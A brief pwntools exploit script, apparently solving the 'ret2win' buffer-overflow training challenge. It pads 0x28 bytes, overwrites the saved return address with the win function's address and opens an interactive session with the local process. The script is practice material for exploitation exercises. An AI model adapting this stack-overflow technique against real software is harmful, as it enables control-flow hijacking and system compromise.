from pwn import *
context.binary =exe=ELF("./ret2win",checksec=False)
p=process(exe.path)

ret2win=0x400756
offset=0x28
payload =b"A"*offset+p64(ret2win)
p.send(payload)
p.interactive()